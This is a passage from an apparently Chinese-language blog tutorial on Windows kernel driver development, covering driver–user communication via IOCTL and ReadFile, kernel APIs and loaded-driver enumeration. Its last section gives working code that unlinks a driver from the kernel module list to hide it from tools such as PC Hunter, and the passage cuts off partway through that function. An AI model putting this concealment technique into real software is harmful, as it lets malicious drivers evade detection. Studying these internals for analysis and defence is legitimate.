class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 自定义控制码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MY_CONTROL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建设备</span></span><br><span class="line">HANDLE hDevice = <span class="built_in">CreateFile</span>(<span class="string">L&quot;\\\\.\\MyUniqueDevice&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open device. Error: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> inputBuffer[<span class="number">100</span>] = <span class="string">&quot;Hello, driver!&quot;</span>;</span><br><span class="line"><span class="type">char</span> outputBuffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line"><span class="comment">// 使用DeviceIoControl打开设备并通过自定义控制码发送和接收数据</span></span><br><span class="line">BOOL success = <span class="built_in">DeviceIoControl</span>(hDevice,</span><br><span class="line">IOCTL_MY_CONTROL_CODE,</span><br><span class="line">inputBuffer, <span class="built_in">sizeof</span>(inputBuffer),</span><br><span class="line">outputBuffer, <span class="built_in">sizeof</span>(outputBuffer),</span><br><span class="line">&amp;bytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (success) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Received from driver: %s\n&quot;</span>, outputBuffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DeviceIoControl failed. Error: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用ReadFile进行通信"><a href="#使用ReadFile进行通信" class="headerlink" title="使用ReadFile进行通信"></a>使用ReadFile进行通信</h3><h4 id="驱动代码"><a href="#驱动代码" class="headerlink" title="驱动代码"></a>驱动代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理读取回调函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyDriverDeviceReadControl</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span> </span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(DeviceObject);</span><br><span class="line"></span><br><span class="line">PIO_STACK_LOCATION stack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);</span><br><span class="line">ULONG bufferLength = stack-&gt;Parameters.Read.Length;</span><br><span class="line">NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备要发送到用户态的数据</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* message = <span class="string">&quot;Hello From Kernel!&quot;</span>;</span><br><span class="line">ULONG messageLength = (ULONG)<span class="built_in">strlen</span>(message) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查缓冲区大小</span></span><br><span class="line"><span class="keyword">if</span> (bufferLength &lt; messageLength) &#123;</span><br><span class="line">status = STATUS_BUFFER_TOO_SMALL;</span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 将数据复制到用户态缓冲区</span></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(Irp-&gt;AssociatedIrp.SystemBuffer, message, messageLength);</span><br><span class="line">Irp-&gt;IoStatus.Information = messageLength;  <span class="comment">// 返回数据长度</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Irp-&gt;IoStatus.Status = status;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建设备</span></span><br><span class="line">    ...</span><br><span class="line">    deviceObject-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">    <span class="comment">// 创建符号链接</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 设置回调函数</span></span><br><span class="line">DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyDriverCreate;<span class="comment">// 默认派发, 允许打开</span></span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyDriverCreate;<span class="comment">// 默认派发, 允许关闭</span></span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyDriverDeviceReadControl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="用户态代码"><a href="#用户态代码" class="headerlink" title="用户态代码"></a>用户态代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 11_01_R3_Communicate(3环通信).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MY_CONTROL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建设备</span></span><br><span class="line">HANDLE hDevice = <span class="built_in">CreateFile</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\MyUniqueDevice&quot;</span>), GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open device. Error: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD bytesRead;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 ReadFile 从驱动读取数据</span></span><br><span class="line">BOOL success = <span class="built_in">ReadFile</span>(hDevice, buffer, <span class="built_in">sizeof</span>(buffer), &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (success) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Received from driver: %s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile failed. Error: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> METHOD_BUFFERED                 0       <span class="comment">// 缓冲模式, 复制一份数据</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> METHOD_IN_DIRECT                1       <span class="comment">// 映射同一个物理地址, 共享物理地址</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> METHOD_OUT_DIRECT               2       <span class="comment">// </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> METHOD_NEITHER                  3       <span class="comment">// 直写</span></span></span><br></pre></td></tr></table></figure><h3 id="驱动通信封装"><a href="#驱动通信封装" class="headerlink" title="驱动通信封装"></a>驱动通信封装</h3><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol><li>注册通信方法</li><li>销毁的方法</li><li>发送通知</li></ol><div class="note red bug"><p><strong>注意</strong></p><p>在使用<code>WriteFile</code>时第四个参数不能使用<code>LPDWORD</code>指针类型直接传参, 会导致程序奔溃, 需要使用<code>DWORD</code>类型然后传递指针;</p></div>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-驱动开发</title>
      <link href="/b57f2803.html"/>
      <url>/b57f2803.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>驱动开发</strong></p></div><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="驱动是进程吗"><a href="#驱动是进程吗" class="headerlink" title="驱动是进程吗"></a>驱动是进程吗</h3><blockquote><p>驱动并不是进程, 而是叫模块（本质上和dll是一样的）;</p></blockquote><h3 id="驱动类型"><a href="#驱动类型" class="headerlink" title="驱动类型"></a>驱动类型</h3><blockquote><p>NT: NT4虚拟驱动（现在基本没有纯NT4的驱动）;<br>WDM: 是一个热拔插方式;<br>WDF: 简化开发, 相当于事件驱动机制; KWDF（内核驱动框架）, UWDF（用户驱动框架）;</p></blockquote><h3 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h3><blockquote><ol><li>服务加载<br>OpenSrcManager<br>CreateService<br>StartService<br>StopService<br>DeleteService</li></ol></blockquote><blockquote><ol start="2"><li>本地加载<br>Zw&#x2F;NtLoadDriver<br>Zw&#x2F;NtUnloadDriver</li></ol></blockquote><h1 id="驱动基础"><a href="#驱动基础" class="headerlink" title="驱动基础"></a>驱动基础</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><blockquote><p>int &#x3D;&gt; INT short &#x3D;&gt; SHORT long &#x3D;&gt; LONG</p></blockquote><h3 id="字符串函数-申请内存函数"><a href="#字符串函数-申请内存函数" class="headerlink" title="字符串函数, 申请内存函数"></a>字符串函数, 申请内存函数</h3><h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><blockquote><ol><li>RtlInitString: 初始化多字节ascii</li></ol></blockquote><blockquote><ol start="2"><li>RtlInitUnicodeString: 初始化宽字符</li></ol></blockquote><blockquote><ol start="3"><li>RtlFreeUnicodeString: 释放unicode字符串</li></ol></blockquote><blockquote><ol start="4"><li>RtlStringCbPrintfA: 格式化输出, 引用#include &lt;ntstrsafe.h&gt;</li></ol></blockquote><blockquote><ol start="5"><li>RtlCompareUnicodeString: 字符串比较</li></ol></blockquote><h4 id="内存操作"><a href="#内存操作" class="headerlink" title="内存操作"></a>内存操作</h4><blockquote><ol><li>ExAllocatePool（内存申请）<br>NonPagedPool &#x3D;&gt; 非分页内存（带执行属性）<br>PagedPool &#x3D;&gt; 分页内存（不带执行属性）</li></ol></blockquote><blockquote><ol start="2"><li>ExFreePool（释放内存）</li></ol></blockquote><h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><blockquote><ol><li>PsCreateSystemThread（创建线程）</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="function">VOID <span class="title">work</span><span class="params">(PVOID StartContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS status = <span class="built_in">PsCreateSystemThread</span>(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, work, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ZwClose</span>(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="普通链表"><a href="#普通链表" class="headerlink" title="普通链表"></a>普通链表</h3><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><blockquote><p>InitializeListHead（初始化链表）<br>IsListEmpty（判断链表是否为空）<br>InsertHeadList（链表头部插入数据）<br>InsertTailList（链表尾部插入数据）<br>RemoveHeadList（移除链表头部数据）<br>RemoveTailList（移除链表尾部数据）<br>RemoveEntryList（移除空链表）</p></blockquote><h3 id="驱动遍历"><a href="#驱动遍历" class="headerlink" title="驱动遍历"></a>驱动遍历</h3><h4 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_KLDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">ULONG __Undefined1;</span><br><span class="line">ULONG __Undefined2;</span><br><span class="line">ULONG __Undefined3;</span><br><span class="line">ULONG NonPagedDebugInfo;</span><br><span class="line">ULONG DllBase;</span><br><span class="line">ULONG EntryPoint;</span><br><span class="line">ULONG SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">ULONG Flags;</span><br><span class="line">USHORT LoadCount;</span><br><span class="line">USHORT __Undefined5;</span><br><span class="line">ULONG  __Undefined6;</span><br><span class="line">ULONG  CheckSum;</span><br><span class="line">ULONG  TimeDateStamp;</span><br><span class="line"></span><br><span class="line">&#125; KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;-----------DriverUnload-----------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// DbgBreakPoint();</span></span><br><span class="line"><span class="comment">// 遍历驱动</span></span><br><span class="line">PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class="line">PKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">PKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next != pre)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: Driver Name = %wZ\r\n&quot;</span>, &amp;next-&gt;FullDllName);</span><br><span class="line">next = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="驱动断链"><a href="#驱动断链" class="headerlink" title="驱动断链"></a>驱动断链</h3><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">ntdll!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 Void                 <span class="comment">// 链表</span></span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x024</span> HardwareDatabase : Ptr32 _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x028</span> FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH</span><br><span class="line">   +<span class="number">0x02c</span> DriverInit       : Ptr32     <span class="type">long</span> </span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32     <span class="type">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32     <span class="type">void</span> </span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32     <span class="type">long</span> </span><br></pre></td></tr></table></figure><h4 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_KLDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">ULONG __Undefined1;</span><br><span class="line">ULONG __Undefined2;</span><br><span class="line">ULONG __Undefined3;</span><br><span class="line">ULONG NonPagedDebugInfo;</span><br><span class="line">ULONG DllBase;</span><br><span class="line">ULONG EntryPoint;</span><br><span class="line">ULONG SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">ULONG Flags;</span><br><span class="line">USHORT LoadCount;</span><br><span class="line">USHORT __Undefined5;</span><br><span class="line">ULONG  __Undefined6;</span><br><span class="line">ULONG  CheckSum;</span><br><span class="line">ULONG  TimeDateStamp;</span><br><span class="line"></span><br><span class="line">&#125; KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="function">NTKERNELAPI NTSTATUS <span class="title">ObReferenceObjectByName</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in PUNICODE_STRING ObjectName,</span></span></span><br><span class="line"><span class="params"><span class="function">__in ULONG Attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">__in_opt PACCESS_STATE AccessState,</span></span></span><br><span class="line"><span class="params"><span class="function">__in_opt ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">__in POBJECT_TYPE ObjectType,</span></span></span><br><span class="line"><span class="params"><span class="function">__in KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">__inout_opt PVOID ParseContext,</span></span></span><br><span class="line"><span class="params"><span class="function">__out PVOID *Object</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> POBJECT_TYPE * IoDriverObjectType;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DriverHide</span><span class="params">(PWCH wcObjectName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LARGE_INTEGER in = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">in.QuadPart = <span class="number">-10000</span> * <span class="number">5000</span>;</span><br><span class="line"><span class="built_in">KeDelayExecutionThread</span>(KernelMode, FALSE, &amp;in);</span><br><span class="line">UNICODE_STRING usDriverName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;usDriverName, wcObjectName);</span><br><span class="line">PDRIVER_OBJECT pDriverObject = <span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS status = <span class="built_in">ObReferenceObjectByName</span>(&amp;usDriverName, FILE_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, IoDriverObjectType, KernelMode, <span class="literal">NULL</span>, &amp;pDriverObject);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line">PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriverObject-&gt;DriverSection;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: Driver Name = %wZ\r\n&quot;</span>, &amp;ldr-&gt;FullDllName);</span><br><span class="line"><span class="comment">// pDriverObject-&gt;DriverSection = ldr-&gt;InLoadOrderLinks.Flink;// 修复pc hunter 卡死（移花接木）</span></span><br><span class="line"><span class="built_in">RemoveEntryList</span>(&amp;ldr-&gt;InLoadOrderLinks);</span><br><span class="line">pDriverObject-&gt;DriverInit = <span class="literal">NULL</span>;</span><br><span class="line">pDriverObject-&gt;DriverSection = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">ObDereferenceObject</span>(pDriverObject);<span class="comment">// 